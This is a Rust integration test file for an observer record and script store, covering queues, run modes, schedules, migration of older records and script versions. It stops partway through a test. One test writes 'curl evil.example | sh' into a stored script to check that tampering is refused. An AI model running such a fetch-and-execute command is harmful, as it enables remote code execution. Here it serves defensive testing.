//! Integration tests of the observers' model and file store: records, run
//! modes and queues, schedules, script versions, run errors, queue entries
//! and the reading of records of an older version.
//!
//! Every test runs against a real temporary directory: the value of the
//! store lies in real file operations, locks and exclusive creates.

use chrono::{DateTime, Duration, TimeZone, Utc};
use narsor_engine::domain::{TaskId, WorkflowDefinition};
use narsor_engine::observers::migrate::DELIVER_EVENT_REMOVED_NOTE;
use narsor_engine::observers::{
    parse_script_output, queue_entry_id, ActiveRun, ContractError, CreateTaskEffect, EntryWrite,
    ObserverConfig, ObserverEffect, ObserverError, ObserverId, ObserverMode, ObserverName,
    ObserverRecord, ObserverState, ObserverStore, QueueEntry, RunEntry, RunFailure, RunId,
    RunStatus, ScheduleConfig, ScriptChoice, ScriptEntry, ScriptInput, ScriptObserver,
    ScriptVariable, SecretRef, DEFAULT_INTERVAL_SECS, KEPT_RUN_FAILURES, MAX_SCRIPT_OUTPUT_BYTES,
    OBSERVER_RECORD_VERSION, RUN_FAILURE_VERSION, SCRIPT_CONTRACT_VERSION,
};
use narsor_engine::orchestration::OwnerRef;
use narsor_engine::persistence::paths::temp_path_for;
use narsor_engine::persistence::StatePaths;
use narsor_protocol::controller::{GateWatch, GateWatchChoice, GateWatchVariable};
use serde_json::json;
use std::fs;
use std::path::{Path, PathBuf};

/// A temporary state root that deletes itself when dropped.
struct TempRoot {
    path: PathBuf,
}

impl TempRoot {
    fn new() -> Self {
        let path = std::env::temp_dir().join(format!("narsor-observers-{}", uuid::Uuid::new_v4()));
        fs::create_dir_all(&path).expect("create temp root");
        Self { path }
    }

    fn store(&self) -> ObserverStore {
        ObserverStore::new(StatePaths::new(&self.path))
    }

    fn paths(&self) -> StatePaths {
        StatePaths::new(&self.path)
    }
}

impl Drop for TempRoot {
    fn drop(&mut self) {
        let _ = fs::remove_dir_all(&self.path);
    }
}

fn now() -> DateTime<Utc> {
    Utc.with_ymd_and_hms(2026, 11, 13, 12, 0, 0).unwrap()
}

fn owner() -> OwnerRef {
    OwnerRef::new("owner")
}

fn name(value: &str) -> ObserverName {
    ObserverName::parse(value).unwrap()
}

/// The catalogue's definition of `triage` version 1, with inputs `ticket`
/// and `summary`.
fn triage_workflow() -> WorkflowDefinition {
    serde_json::from_value(json!({
        "id": "triage",
        "name": "triage",
        "version": 1,
        "inputs": [{"name": "ticket", "required": true}, {"name": "summary"}],
        "states": {},
        "initial_state": "start",
    }))
    .expect("a minimal workflow definition")
}

fn create_task_effect() -> ObserverEffect {
    ObserverEffect::CreateTask(CreateTaskEffect {
        workflow_id: "triage".into(),
        workflow_version: 1,
        workspaces: Default::default(),
        backend_id: Some("local".into()),
        profile: None,
        mapping: [("ticket".to_string(), "key".to_string())]
            .into_iter()
            .collect(),
    })
}

fn jira_config(observer: &str) -> ObserverConfig {
    let mut config =
        ObserverConfig::new(name(observer), create_task_effect(), ObserverMode::Always);
    config.condition = json!({"jql": "project = ABC AND labels = narsor"});
    config.secrets = vec![SecretRef {
        name: "jira-token".into(),
        env: "JIRA_TOKEN".into(),
    }];
    config
}

/// An `on_episodes` observer of the queue `queue` that creates no tasks.
fn review_config(observer: &str, queue: &str) -> ObserverConfig {
    let mut config = ObserverConfig::new(
        name(observer),
        ObserverEffect::None,
        ObserverMode::OnEpisodes,
    );
    config.queue = queue.into();
    config
}

/// A `jira-intake`-like `always` observer of the queue `queue`.
fn source_config(observer: &str, queue: &str) -> ObserverConfig {
    let mut config = jira_config(observer);
    config.queue = queue.into();
    config
}

fn create(store: &ObserverStore, owner: OwnerRef, config: ObserverConfig) -> ObserverRecord {
    store
        .create(owner, config, Some(&triage_workflow()), now())
        .expect("create observer")
}

fn create_jira(store: &ObserverStore, observer: &str) -> ObserverRecord {
    store
        .create(
            owner(),
            jira_config(observer),
            Some(&triage_workflow()),
            now(),
        )
        .expect("create observer")
}

fn script_input(record: &ObserverRecord) -> ScriptInput {
    ScriptInput {
        contract_version: SCRIPT_CONTRACT_VERSION,
        observer: ScriptObserver {
            id: record.observer_id.clone(),
            name: record.config.name.clone(),
        },
        condition: record.config.condition.clone(),
        state: Some(json!({"cursor": 4})),
        entry: Some(ScriptEntry {
            task_id: TaskId::parse("task-1").unwrap(),
            episode: "input-1".into(),
            episode_started_at: now(),
            step: "review_work".into(),
            params: [("mr_url".to_string(), "https://gitlab/1".to_string())].into(),
            choices: vec![
                ScriptChoice {
                    name: "check_feedback".into(),
                    description: Some("Read the feedback".into()),
                    requires_variables: Vec::new(),
                },
                ScriptChoice {
                    name: "revise_plan".into(),
                    description: None,
                    requires_variables: vec!["note".into()],
                },
            ],
            variables: vec![
                ScriptVariable {
                    name: "note".into(),
                    variable_type: Some("text".into()),
                    description: Some("What to change".into()),
                    options: Vec::new(),
                },
                ScriptVariable {
                    name: "severity".into(),
                    variable_type: Some("select".into()),
                    description: None,
                    options: vec!["low".into(), "high".into()],
                },
            ],
        }),
        first_run: true,
        import_backlog: false,
    }
}

fn active_run(sequence: u64) -> ActiveRun {
    ActiveRun {
        sequence,
        script_version: 1,
        claimed_at: now(),
        deadline: now() + Duration::seconds(360),
        token_digest: "sha256:abc".into(),
        tasks_created: 2,
        entry: None,
    }
}

fn failure(record: &ObserverRecord, sequence: u64) -> RunFailure {
    RunFailure {
        record_version: RUN_FAILURE_VERSION,
        observer_id: record.observer_id.clone(),
        sequence,
        script_version: 1,
        claimed_at: now(),
        finished_at: now() + Duration::seconds(5),
        status: RunStatus::Failed,
        exit_code: Some(1),
        error: "the script exited with code 1".into(),
        stdout: Some(String::new()),
        stderr: Some("boom".into()),
        entry_id: None,
    }
}

/// The gate `review_work` with its `watch` on `queue`.
fn gate(queue: &str) -> GateWatch {
    GateWatch {
        step: "review_work".into(),
        queue: queue.into(),
        params: [
            (
                "mr_url".to_string(),
                "https://gitlab/a/-/merge_requests/17".to_string(),
            ),
            ("label".to_string(), "w CR".to_string()),
        ]
        .into(),
        choices: vec![
            GateWatchChoice {
                name: "check_feedback".into(),
                description: Some("Read the review".into()),
                requires_variables: Vec::new(),
            },
            GateWatchChoice {
                name: "revise_plan".into(),
                description: None,
                requires_variables: vec!["note".into()],
            },
        ],
        variables: vec![GateWatchVariable {
            name: "note".into(),
            variable_type: Some("text".into()),
            description: None,
            options: Vec::new(),
        }],
    }
}

/// The entry of `episode` of `task` of `owner` on `queue`.
fn entry(owner: OwnerRef, queue: &str, task: &str, episode: &str) -> QueueEntry {
    QueueEntry::from_gate(
        owner,
        TaskId::parse(task).unwrap(),
        episode,
        &gate(queue),
        now(),
    )
}

/// Writes `value` as the record of a new observer `observer_id`, as an
/// older build left it.
fn write_raw_record(root: &TempRoot, observer_id: &str, value: serde_json::Value) -> ObserverId {
    let path = root.paths().observer_record_file(observer_id);
    fs::create_dir_all(path.parent().unwrap()).unwrap();
    fs::write(&path, serde_json::to_vec(&value).unwrap()).unwrap();
    ObserverId::parse(observer_id).unwrap()
}

fn invalid_reason(error: ObserverError) -> String {
    match error {
        ObserverError::Invalid { field, reason } => format!("{field}: {reason}"),
        other => panic!("expected a validation refusal, got {other:?}"),
    }
}

// ---------------------------------------------------------------------------
// The record
// ---------------------------------------------------------------------------

#[test]
fn a_new_observer_is_a_draft_without_an_approved_version() {
    let root = TempRoot::new();
    let store = root.store();

    let record = create_jira(&store, "jira-abc");

    assert_eq!(record.state, ObserverState::Draft);
    assert_eq!(record.approved_version, None);
    assert_eq!(
        record.config.schedule.interval_secs(),
        Some(DEFAULT_INTERVAL_SECS)
    );
    assert_eq!(record.config.queue, "jira-abc");
    assert_eq!(record.config.mode, ObserverMode::Always);
    assert_eq!(record.config.task_limit_per_run, 10);
    assert_eq!(record.owner, owner());
    assert_eq!(record.record_version, OBSERVER_RECORD_VERSION);
    assert_eq!(record.next_run_at, None);
    assert_eq!(record.run_due_since, None);
    assert!(record.scripts.is_empty());
    assert_eq!(store.load(&record.observer_id).unwrap(), record);
    assert_eq!(
        store
            .find_by_name("jira-abc")
            .unwrap()
            .map(|r| r.observer_id),
        Some(record.observer_id)
    );
}

#[test]
fn an_interval_under_sixty_seconds_is_refused() {
    let root = TempRoot::new();
    let store = root.store();
    let mut config = jira_config("jira-abc");
    config.schedule = ScheduleConfig::Interval { secs: 30 };

    let error = store
        .create(owner(), config, Some(&triage_workflow()), now())
        .unwrap_err();

    let reason = invalid_reason(error);
    assert!(reason.contains("at least 60 seconds"), "{reason}");
    assert!(store.list().unwrap().is_empty());
}

#[test]
fn a_second_observer_with_the_same_name_is_refused() {
    let root = TempRoot::new();
    let store = root.store();
    create_jira(&store, "jira-abc");

    let error = store
        .create(
            owner(),
            jira_config("jira-abc"),
            Some(&triage_workflow()),
            now(),
        )
        .unwrap_err();

    assert!(matches!(error, ObserverError::NameTaken(taken) if taken.as_str() == "jira-abc"));
    assert_eq!(store.list().unwrap().len(), 1);
}

#[test]
fn concurrent_creations_of_one_name_give_one_observer() {
    let root = TempRoot::new();
    let store = root.store();

    let created: Vec<bool> = std::thread::scope(|scope| {
        let handles: Vec<_> = (0..8)
            .map(|_| {
                let store = store.clone();
                scope.spawn(move || {
                    store
                        .create(
                            owner(),
                            jira_config("jira-abc"),
                            Some(&triage_workflow()),
                            now(),
                        )
                        .is_ok()
                })
            })
            .collect();
        handles.into_iter().map(|h| h.join().unwrap()).collect()
    });

    assert_eq!(created.iter().filter(|ok| **ok).count(), 1);
    assert_eq!(store.list().unwrap().len(), 1);
}

// ---------------------------------------------------------------------------
// Queues and run modes
// ---------------------------------------------------------------------------

#[test]
fn two_observers_of_one_queue_with_the_same_mode_are_created() {
    let root = TempRoot::new();
    let store = root.store();

    let gitlab = create(&store, owner(), review_config("gitlab-mr", "mr-review"));
    let github = create(&store, owner(), review_config("github-pr", "mr-review"));

    let observers = store.queue_observers(&owner(), "mr-review").unwrap();
    assert_eq!(observers, vec![github, gitlab]);
    assert!(store.queue_observers(&owner(), "other").unwrap().is_empty());
}

#[test]
fn an_observer_of_another_mode_in_a_queue_is_refused_and_names_the_queues_mode() {
    // Covers AE8.
    let root = TempRoot::new();
    let store = root.store();
    create(&store, owner(), review_config("gitlab-mr", "mr-review"));

    let error = store
        .create(
            owner(),
            source_config("jira-new", "mr-review"),
            Some(&triage_workflow()),
            now(),
        )
        .unwrap_err();

    match &error {
        ObserverError::QueueModeMismatch { queue, mode, .. } => {
            assert_eq!(queue, "mr-review");
            assert_eq!(*mode, ObserverMode::OnEpisodes);
        }
        other => panic!("expected a mode mismatch, got {other:?}"),
    }
    let message = error.to_string();
    assert!(message.contains("'mr-review'"), "{message}");
    assert!(message.contains("on_episodes"), "{message}");
    assert_eq!(store.list().unwrap().len(), 1);
}

#[test]
fn queues_of_two_owners_with_one_name_are_two_queues() {
    // R7: the mode check and the entries are per owner.
    let root = TempRoot::new();
    let store = root.store();
    let other = OwnerRef::new("someone-else");
    create(&store, owner(), review_config("gitlab-mr", "mr-review"));
    create(
        &store,
        other.clone(),
        source_config("their-jira", "mr-review"),
    );

    let lock = store.lock_queue_entries().unwrap();
    let mine = entry(owner(), "mr-review", "task-1", "input-1");
    let theirs = entry(other.clone(), "mr-review", "task-2", "input-1");
    store.add_queue_entry(&lock, &mine).unwrap();
    store.add_queue_entry(&lock, &theirs).unwrap();
    drop(lock);

    assert_eq!(
        store.queue_entries(&owner(), "mr-review").unwrap(),
        vec![mine]
    );
    assert_eq!(
        store.queue_entries(&other, "mr-review").unwrap(),
        vec![theirs]
    );
    assert_eq!(store.queue_observers(&other, "mr-review").unwrap().len(), 1);
}

#[test]
fn concurrent_creations_of_two_modes_in_one_queue_leave_one_mode() {
    // KTD-7: the check runs under the creation lock.
    for _ in 0..4 {
        let root = TempRoot::new();
        let store = root.store();
        let results: Vec<(ObserverMode, bool)> = std::thread::scope(|scope| {
            let handles: Vec<_> = (0..8)
                .map(|index| {
                    let store = store.clone();
                    scope.spawn(move || {
                        let config = if index % 2 == 0 {
                            review_config(&format!("review-{index}"), "shared")
                        } else {
                            source_config(&format!("source-{index}"), "shared")
                        };
                        let mode = config.mode;
                        let created = store
                            .create(owner(), config, Some(&triage_workflow()), now())
                            .is_ok();
                        (mode, created)
                    })
                })
                .collect();
            handles.into_iter().map(|h| h.join().unwrap()).collect()
        });

        let modes: std::collections::BTreeSet<&str> = results
            .iter()
            .filter(|(_, created)| *created)
            .map(|(mode, _)| mode.as_str())
            .collect();
        assert_eq!(modes.len(), 1, "{results:?}");
        let stored = store.queue_observers(&owner(), "shared").unwrap();
        assert!(!stored.is_empty());
        assert!(stored
            .iter()
            .all(|record| record.config.mode.as_str() == *modes.first().unwrap()));
    }
}

#[test]
fn an_update_may_not_mix_modes_but_may_move_an_observer_to_another_queue() {
    let root = TempRoot::new();
    let store = root.store();
    create(&store, owner(), review_config("gitlab-mr", "mr-review"));
    let jira = create(&store, owner(), source_config("jira-new", "jira-intake"));

    let mut into_review = jira.config.clone();
    into_review.queue = "mr-review".into();
    let error = store
        .update_config(
            &jira.observer_id,
            into_review,
            Some(&triage_workflow()),
            now(),
        )
        .unwrap_err();
    assert!(matches!(error, ObserverError::QueueModeMismatch { .. }));
    assert_eq!(
        store.load(&jira.observer_id).unwrap().config.queue,
        "jira-intake"
    );

    // The only observer of its queue may change the queue's mode; the
    // round of the old mode ends.
    {
        let lock = store.lock(&jira.observer_id).unwrap();
        let mut record = store.load(&jira.observer_id).unwrap();
        record.entry_round = vec!["0".repeat(64)];
        store.save(&lock, &mut record, now()).unwrap();
    }
    let jira = store.load(&jira.observer_id).unwrap();
    let mut on_episodes = jira.config.clone();
    on_episodes.mode = ObserverMode::OnEpisodes;
    on_episodes.schedule =
        ScheduleConfig::from_parts(None, Some("*/5 * * * *".to_string())).unwrap();
    let updated = store
        .update_config(
            &jira.observer_id,
            on_episodes,
            Some(&triage_workflow()),
            now() + Duration::seconds(1),
        )
        .unwrap();
    assert_eq!(updated.config.mode, ObserverMode::OnEpisodes);
    assert!(updated.entry_round.is_empty());
    assert_eq!(updated.revision, jira.revision + 1);
    assert_eq!(updated.state, jira.state);
    assert_eq!(store.load(&jira.observer_id).unwrap(), updated);

    let mut renamed = updated.config.clone();
    renamed.name = name("gitlab-mr");
    assert!(matches!(
        store.update_config(&jira.observer_id, renamed, Some(&triage_workflow()), now()),
        Err(ObserverError::NameTaken(_))
    ));
}

#[test]
fn an_update_checks_a_changed_effect_only_and_moves_the_next_tick_of_a_new_schedule() {
    // The catalogue may have moved on: an unchanged "create a task" effect
    // needs no workflow to update the queue or the schedule.
    let root = TempRoot::new();
    let store = root.store();
    let jira = create(&store, owner(), source_config("jira-new", "jira-intake"));
    {
        let lock = store.lock(&jira.observer_id).unwrap();
        let mut record = store.load(&jira.observer_id).unwrap();
        record.next_run_at = Some(now());
        record.entry_last_runs = [("0".repeat(64), now())].into();
        store.save(&lock, &mut record, now()).unwrap();
    }

    let mut config = jira.config.clone();
    config.schedule = ScheduleConfig::from_parts(None, Some("0 8 * * *".to_string())).unwrap();
    let later = now() + Duration::seconds(30);
    let updated = store
        .update_config(&jira.observer_id, config, None, later)
        .unwrap();
    assert_eq!(
        updated.next_run_at,
        Some(Utc.with_ymd_and_hms(2026, 11, 14, 8, 0, 0).unwrap()),
        "a new schedule counts from the update"
    );
    assert_eq!(updated.entry_last_runs.len(), 1, "same queue, same mode");

    // The same schedule keeps the next tick; a new queue forgets the last
    // runs of the old queue's entries.
    let mut moved = updated.config.clone();
    moved.queue = "jira-other".into();
    let moved = store
        .update_config(
            &jira.observer_id,
            moved,
            None,
            later + Duration::seconds(30),
        )
        .unwrap();
    assert_eq!(moved.next_run_at, updated.next_run_at);
    assert!(moved.entry_last_runs.is_empty());

    // A changed effect is checked against the catalogue's workflow.
    let mut other = moved.config.clone();
    let ObserverEffect::CreateTask(effect) = &mut other.effect else {
        panic!("a create-task observer");
    };
    effect.mapping.insert("summary".into(), "title".into());
    assert!(matches!(
        store.update_config(&jira.observer_id, other.clone(), None, later),
        Err(ObserverError::WorkflowNotFound(_))
    ));
    let changed = store
        .update_config(&jira.observer_id, other, Some(&triage_workflow()), later)
        .unwrap();
    let ObserverEffect::CreateTask(effect) = changed.config.effect else {
        panic!("a create-task observer");
    };
    assert_eq!(effect.mapping["summary"], "title");

    // A draft has no next tick to move.
    let draft = create(&store, owner(), review_config("gitlab-mr", "mr-review"));
    let mut config = draft.config.clone();
    config.schedule = ScheduleConfig::from_parts(Some(600), None).unwrap();
    let draft = store
        .update_config(&draft.observer_id, config, None, later)
        .unwrap();
    assert_eq!(draft.next_run_at, None);
}

#[test]
fn a_queue_name_must_be_a_plain_name() {
    let root = TempRoot::new();
    let store = root.store();
    for queue in ["", "a b", "../x", "{{ queue }}"] {
        let reason = invalid_reason(
            store
                .create(owner(), review_config("gitlab-mr", queue), None, now())
                .unwrap_err(),
        );
        assert!(reason.starts_with("queue:"), "{queue}: {reason}");
    }
    assert!(store.list().unwrap().is_empty());
}

#[test]
fn a_cron_schedule_is_stored_as_its_text() {
    let root = TempRoot::new();
    let store = root.store();
    let mut config = jira_config("jira-new");
    config.schedule = ScheduleConfig::from_parts(None, Some("0 8 * * 1-5".into())).unwrap();

    let record = create(&store, owner(), config);

    let raw: serde_json::Value = serde_json::from_slice(
        &fs::read(
            root.paths()
                .observer_record_file(record.observer_id.as_str()),
        )
        .unwrap(),
    )
    .unwrap();
    assert_eq!(raw["config"]["schedule"], json!({"cron": "0 8 * * 1-5"}));
    assert_eq!(store.load(&record.observer_id).unwrap(), record);
}

#[test]
fn a_create_task_effect_needs_its_workflow_and_its_mapped_inputs() {
    let root = TempRoot::new();
    let store = root.store();

    let missing = store
        .create(owner(), jira_config("a"), None, now())
        .unwrap_err();
    assert!(matches!(missing, ObserverError::WorkflowNotFound(workflow) if workflow == "triage"));

    let mut config = jira_config("b");
    if let ObserverEffect::CreateTask(effect) = &mut config.effect {
        effect.mapping.insert("priority".into(), "prio".into());
    }
    let reason = invalid_reason(
        store
            .create(owner(), config, Some(&triage_workflow()), now())
            .unwrap_err(),
    );
    assert!(reason.contains("'priority'"), "{reason}");

    let mut config = jira_config("c");
    if let ObserverEffect::CreateTask(effect) = &mut config.effect {
        effect.workflow_version = 2;
    }
    assert!(store
        .create(owner(), config, Some(&triage_workflow()), now())
        .is_err());
    assert!(store.list().unwrap().is_empty());
}

#[test]
fn invalid_secrets_and_conditions_are_refused() {
    let root = TempRoot::new();
    let store = root.store();
    let workflow = triage_workflow();

    let mut config = jira_config("a");
    config.secrets.push(SecretRef {
        name: "other".into(),
        env: "JIRA_TOKEN".into(),
    });
    assert!(invalid_reason(
        store
            .create(owner(), config, Some(&workflow), now())
            .unwrap_err()
    )
    .contains("used twice"));

    let mut config = jira_config("b");
    config.secrets[0].env = "NARSOR_TOKEN".into();
    assert!(invalid_reason(
        store
            .create(owner(), config, Some(&workflow), now())
            .unwrap_err()
    )
    .contains("reserved"));

    let mut config = jira_config("c");
    config.condition = json!("project = ABC");
    assert!(invalid_reason(
        store
            .create(owner(), config, Some(&workflow), now())
            .unwrap_err()
    )
    .contains("JSON object"));

    let mut config = jira_config("d");
    config.task_limit_per_run = 0;
    assert!(store
        .create(owner(), config, Some(&workflow), now())
        .is_err());
}

#[test]
fn an_older_record_without_the_newer_fields_loads_with_defaults() {
    let root = TempRoot::new();
    let store = root.store();
    let id = write_raw_record(
        &root,
        "obs-0123456789abcdef",
        json!({
            "record_version": 1,
            "observer_id": "obs-0123456789abcdef",
            "owner": "owner",
            "created_at": "2026-11-01T00:00:00Z",
            "config": {
                "name": "legacy",
                "source": "jira",
                "effect": {"kind": "create_task", "workflow_id": "triage", "workflow_version": 1},
            },
        }),
    );

    let record = store.load(&id).unwrap();

    assert_eq!(record.state, ObserverState::Draft);
    assert_eq!(
        record.config.schedule.interval_secs(),
        Some(DEFAULT_INTERVAL_SECS)
    );
    assert_eq!(record.config.task_limit_per_run, 10);
    assert_eq!(record.config.queue, "legacy");
    assert_eq!(record.config.mode, ObserverMode::Always);
    assert_eq!(record.config.condition, json!({}));
    assert_eq!(record.approved_version, None);
    assert_eq!(record.consecutive_failures, 0);
    assert!(!record.first_run_done);
    assert!(record.scripts.is_empty());
    assert_eq!(store.list().unwrap().len(), 1);
}

#[test]
fn a_version_one_record_loads_with_its_name_as_queue_and_its_mode_and_interval() {
    // KTD-8: watch_mode all → always, watch_list → on_episodes; the
    // interval is kept; the next save writes version 2.
    let root = TempRoot::new();
    let store = root.store();
    let jira = write_raw_record(
        &root,
        "obs-0000000000000001",
        json!({
            "record_version": 1,
            "observer_id": "obs-0000000000000001",
            "owner": "owner",
            "created_at": "2026-11-01T00:00:00Z",
            "state": "active",
            "approved_version": 1,
            "next_run_at": "2026-11-13T12:05:00Z",
            "config": {
                "name": "jira-new",
                "source": "jira",
                "schedule": {"interval_secs": 900},
                "effect": {"kind": "create_task", "workflow_id": "triage", "workflow_version": 1},
                "watch_mode": "all",
                "watch_objects": {"allowed_prefixes": [], "max_len": 512},
            },
        }),
    );
    let review = write_raw_record(
        &root,
        "obs-0000000000000002",
        json!({
            "record_version": 1,
            "observer_id": "obs-0000000000000002",
            "owner": "owner",
            "created_at": "2026-11-01T00:00:00Z",
            "state": "active",
            "config": {
                "name": "mr-watch",
                "source": "gitlab",
                "effect": {"kind": "create_task", "workflow_id": "triage", "workflow_version": 1},
                "watch_mode": "watch_list",
                "watch_objects": {"allowed_prefixes": ["https://gitlab/"], "max_len": 512},
            },
        }),
    );

    let jira_record = store.load(&jira).unwrap();
    assert_eq!(jira_record.record_version, OBSERVER_RECORD_VERSION);
    assert_eq!(jira_record.config.queue, "jira-new");
    assert_eq!(jira_record.config.mode, ObserverMode::Always);
    assert_eq!(
        jira_record.config.schedule,
        ScheduleConfig::Interval { secs: 900 }
    );
    assert_eq!(jira_record.state, ObserverState::Active);
    assert_eq!(jira_record.note, None);
    let review_record = store.load(&review).unwrap();
    assert_eq!(review_record.config.queue, "mr-watch");
    assert_eq!(review_record.config.mode, ObserverMode::OnEpisodes);
    assert_eq!(store.list_readable().unwrap().len(), 2);

    let lock = store.lock(&jira).unwrap();
    let mut saved = jira_record.clone();
    store.save(&lock, &mut saved, now()).unwrap();
    let raw: serde_json::Value = serde_json::from_slice(
        &fs::read(root.paths().observer_record_file(jira.as_str())).unwrap(),
    )
    .unwrap();
    assert_eq!(raw["record_version"], json!(OBSERVER_RECORD_VERSION));
    assert_eq!(raw["config"]["queue"], "jira-new");
    assert_eq!(raw["config"]["mode"], "always");
    // The removed `source` label of an older record goes with the next save.
    assert!(raw["config"].get("source").is_none());
    assert_eq!(raw["config"]["schedule"], json!({"interval_secs": 900}));
    assert!(raw["config"].get("watch_mode").is_none());
    assert!(raw["config"].get("watch_objects").is_none());
}

#[test]
fn a_version_one_deliver_event_observer_is_paused_with_a_note_and_kept() {
    // KTD-8, U13: not deleted, not run.
    let root = TempRoot::new();
    let store = root.store();
    let id = write_raw_record(
        &root,
        "obs-0000000000000003",
        json!({
            "record_version": 1,
            "observer_id": "obs-0000000000000003",
            "owner": "owner",
            "created_at": "2026-11-01T00:00:00Z",
            "state": "active",
            "approved_version": 1,
            "scripts": [{"version": 1, "created_at": "2026-11-01T00:00:00Z", "sha256": "sha256:x"}],
            "run_due_since": "2026-11-13T11:59:00Z",
            "watch_round": ["0000000000000000000000000000000000000000000000000000000000000000"],
            "config": {
                "name": "gitlab-review",
                "source": "gitlab",
                "effect": {"kind": "deliver_event"},
                "watch_mode": "watch_list",
                "watch_objects": {"allowed_prefixes": ["https://gitlab/"], "max_len": 512},
            },
        }),
    );

    let record = store.load(&id).unwrap();

    assert_eq!(record.state, ObserverState::Paused);
    assert_eq!(record.note.as_deref(), Some(DELIVER_EVENT_REMOVED_NOTE));
    assert_eq!(record.config.effect, ObserverEffect::None);
    assert_eq!(record.config.mode, ObserverMode::OnEpisodes);
    assert_eq!(record.config.queue, "gitlab-review");
    assert_eq!(record.run_due_since, None);
    assert!(record.entry_round.is_empty());
    assert_eq!(record.approved_version, Some(1));
    assert_eq!(record.scripts.len(), 1);
    assert_eq!(store.list().unwrap(), vec![record]);
}

#[test]
fn an_unknown_state_from_a_newer_build_reads_as_unrecognized() {
    let state: ObserverState = serde_json::from_value(json!("hibernating")).unwrap();
    assert_eq!(state, ObserverState::Unrecognized);
    let status: RunStatus = serde_json::from_value(json!("vanished")).unwrap();
    assert_eq!(status, RunStatus::Unrecognized);
}

#[test]
fn a_record_from_a_newer_schema_version_is_refused() {
    let root = TempRoot::new();
    let store = root.store();
    let record = create_jira(&store, "jira-abc");
    let path = root
        .paths()
        .observer_record_file(record.observer_id.as_str());
    let mut raw: serde_json::Value = serde_json::from_slice(&fs::read(&path).unwrap()).unwrap();
    raw["record_version"] = json!(OBSERVER_RECORD_VERSION + 1);
    fs::write(&path, serde_json::to_vec(&raw).unwrap()).unwrap();

    assert!(matches!(
        store.load(&record.observer_id),
        Err(ObserverError::UnsupportedRecordVersion { .. })
    ));
}

#[test]
fn a_save_bumps_the_revision_and_needs_the_observers_own_lock() {
    let root = TempRoot::new();
    let store = root.store();
    let mut record = create_jira(&store, "a");
    let other = create_jira(&store, "b");

    {
        let lock = store.lock(&record.observer_id).unwrap();
        record.state = ObserverState::Paused;
        store.save(&lock, &mut record, now()).unwrap();
    }
    let reloaded = store.load(&record.observer_id).unwrap();
    assert_eq!(reloaded.state, ObserverState::Paused);
    assert_eq!(reloaded.revision, 1);
    assert_eq!(reloaded.updated_at, Some(now()));

    let wrong = store.lock(&other.observer_id).unwrap();
    assert!(matches!(
        store.save(&wrong, &mut record, now()),
        Err(ObserverError::LockMismatch { .. })
    ));
}

#[test]
fn a_deleted_observer_frees_its_name_but_never_its_id() {
    let root = TempRoot::new();
    let store = root.store();
    let first = create_jira(&store, "jira-abc");
    store
        .add_script(&first.observer_id, "echo '{}'\n", now())
        .unwrap();

    assert!(store.delete(&first.observer_id).unwrap());
    assert!(!store.delete(&first.observer_id).unwrap());
    assert!(matches!(
        store.load(&first.observer_id),
        Err(ObserverError::NotFound(_))
    ));
    assert!(!root
        .paths()
        .observer_dir(first.observer_id.as_str())
        .exists());

    let second = create_jira(&store, "jira-abc");
    assert_ne!(second.observer_id, first.observer_id);
}

// ---------------------------------------------------------------------------
// Script versions
// ---------------------------------------------------------------------------

#[test]
fn two_script_saves_give_versions_one_and_two_and_leave_one_unchanged() {
    let root = TempRoot::new();
    let store = root.store();
    let record = create_jira(&store, "jira-abc");
    let id = &record.observer_id;

    assert_eq!(store.add_script(id, "echo one\n", now()).unwrap(), 1);
    let v1_file = root.paths().observer_script_file(id.as_str(), 1);
    let v1_bytes = fs::read(&v1_file).unwrap();
    assert_eq!(
        store
            .add_script(id, "echo two\n", now() + Duration::seconds(1))
            .unwrap(),
        2
    );

    assert_eq!(store.load_script(id, 1).unwrap(), "echo one\n");
    assert_eq!(store.load_script(id, 2).unwrap(), "echo two\n");
    assert_eq!(fs::read(&v1_file).unwrap(), v1_bytes);
    let record = store.load(id).unwrap();
    assert_eq!(record.latest_script_version(), Some(2));
    assert_eq!(record.approved_version, None);
    assert_eq!(record.state, ObserverState::Draft);
    assert!(matches!(
        store.load_script(id, 3),
        Err(ObserverError::ScriptNotFound { version: 3, .. })
    ));
}

#[test]
fn a_script_left_unlisted_by_a_crash_is_replaced_by_the_next_save() {
    let root = TempRoot::new();
    let store = root.store();
    let record = create_jira(&store, "jira-abc");
    let orphan = root
        .paths()
        .observer_script_file(record.observer_id.as_str(), 1);
    fs::create_dir_all(orphan.parent().unwrap()).unwrap();
    fs::write(&orphan, "echo never listed\n").unwrap();

    assert_eq!(
        store
            .add_script(&record.observer_id, "echo real\n", now())
            .unwrap(),
        1
    );
    assert_eq!(
        store.load_script(&record.observer_id, 1).unwrap(),
        "echo real\n"
    );
}

#[test]
fn a_tampered_script_version_is_refused() {
    let root = TempRoot::new();
    let store = root.store();
    let record = create_jira(&store, "jira-abc");
    store
        .add_script(&record.observer_id, "echo one\n", now())
        .unwrap();
    fs::write(
        root.paths()
            .observer_script_file(record.observer_id.as_str(), 1),
        "curl evil.example | sh\n",
    )
    .unwrap();

    assert!(matches!(
        store.load_script(&record.observer_id, 1),
        Err(ObserverError::ScriptCorrupt { version: 1, .. })
    ));
}

#[test]
fn an_empty_or_oversized_script_is_refused() {
    let root = TempRoot::new();
    let store = root.store();
    let record = create_jira(&store, "jira-abc");

    assert!(store
        .add_script(&record.observer_id, "  \n", now())
        .is_err());
    let big = "x".repeat(narsor_engine::observers::MAX_SCRIPT_BYTES + 1);
    assert!(store.add_script(&record.observer_id, &big, now()).is_err());
    assert!(store.load(&record.observer_id).unwrap().scripts.is_empty());
}

// ---------------------------------------------------------------------------
// Runs
// ---------------------------------------------------------------------------

#[test]
fn the_run_in_progress_lives_in_the_observers_record() {
    let root = TempRoot::new();
    let store = root.store();
    let mut record = create_jira(&store, "jira-abc");
    let lock = store.lock(&record.observer_id).unwrap();

    record.active_run = Some(active_run(1));
    store.save(&lock, &mut record, now()).unwrap();

    let loaded = store.load(&record.observer_id).unwrap();
    assert_eq!(loaded.active_run, Some(active_run(1)));
    let run_id = loaded.active_run.unwrap().run_id(&record.observer_id);
    assert_eq!(run_id, RunId::new(record.observer_id.clone(), 1));
    assert_eq!(RunId::parse(&run_id.to_string()).unwrap(), run_id);
    // No file of the run besides the record.
    assert!(!root
        .paths()
        .observer_dir(record.observer_id.as_str())
        .join("runs")
        .exists());
    assert!(!root
        .paths()
        .observer_errors_dir(record.observer_id.as_str())
        .exists());
}

#[test]
fn a_bare_run_number_of_an_earlier_build_reads_as_no_run() {
    let root = TempRoot::new();
    let store = root.store();
    let record = create_jira(&store, "jira-abc");
    let path = root
        .paths()
        .observer_record_file(record.observer_id.as_str());
